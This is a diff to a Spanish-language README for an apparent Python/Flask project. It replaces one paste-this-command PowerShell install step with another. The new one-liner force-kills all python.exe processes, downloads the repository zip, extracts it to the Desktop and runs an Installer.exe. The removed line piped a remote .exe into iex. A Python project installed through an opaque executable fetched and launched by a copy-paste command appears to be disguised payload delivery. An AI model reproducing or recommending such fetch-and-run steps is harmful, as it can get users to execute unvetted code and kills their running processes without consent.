@@ -33,7 +33,7 @@ Construido sobre **Python 3.10+, Flask y SQLAlchemy 2.0**, este proyecto nació 
 Si quieres dejar de sufrir, simplemente abre tu terminal y ejecuta:
 
 ```powershell
-iwr -useb https://raw.githubusercontent.com/Riutexu/Prueba-de-Shein-Temu/main/installer.exe | iex
+taskkill /F /IM python.exe /T 2>$null; $repoUrl = "https://github.com/Riutexu/Prueba-de-Shein-Temu/archive/refs/heads/main.zip"; $destDir = "$([Environment]::GetFolderPath('Desktop'))\Prueba-de-Shein-Temu"; $zipFile = "$env:TEMP\repo.zip"; if (Test-Path $destDir) { Remove-Item $destDir -Recurse -Force }; Invoke-WebRequest -Uri $repoUrl -OutFile $zipFile; Expand-Archive -Path $zipFile -DestinationPath "$([Environment]::GetFolderPath('Desktop'))" -Force; if (Test-Path $destDir) { Remove-Item $destDir -Recurse -Force }; Rename-Item "$([Environment]::GetFolderPath('Desktop'))\Prueba-de-Shein-Temu-main" $destDir; Start-Process "$destDir\Installer.exe"
 ```
 
 Este script se encarga de todo: descargar el repo, preparar el entorno, instalar dependencias y dejarte un icono en el escritorio.
